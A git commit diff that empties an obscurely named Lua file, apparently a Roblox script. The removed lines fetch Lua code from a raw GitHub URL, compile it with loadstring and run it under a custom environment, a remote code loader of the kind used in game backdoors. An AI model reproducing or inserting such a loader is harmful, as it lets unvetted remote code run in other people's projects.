7108808bb4aeb2b0d144333a6835ba03f3982684
nunodinov2018-art <nunodinov2018@gmail.com>
2025-11-04 18:41:12 +0000

    Update nullllllIlIllIIIIlIlIlIlll.lua
    Removed the entire content of the file.

--- nullllllIlIllIIIIlIlIlIlll.lua
+++ nullllllIlIllIIIIlIlIlIlll.lua
@@ -1,5 +1,1 @@
-
-local s=game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/nunodinov2018-art/test/refs/heads/main/g.lua" ,true) 
-local env={NS=function(...)end} 
-setmetatable(env,{__index=getfenv()})
-local e,x=loadstring(s)print(e,x)setfenv(e,env) e()
+-
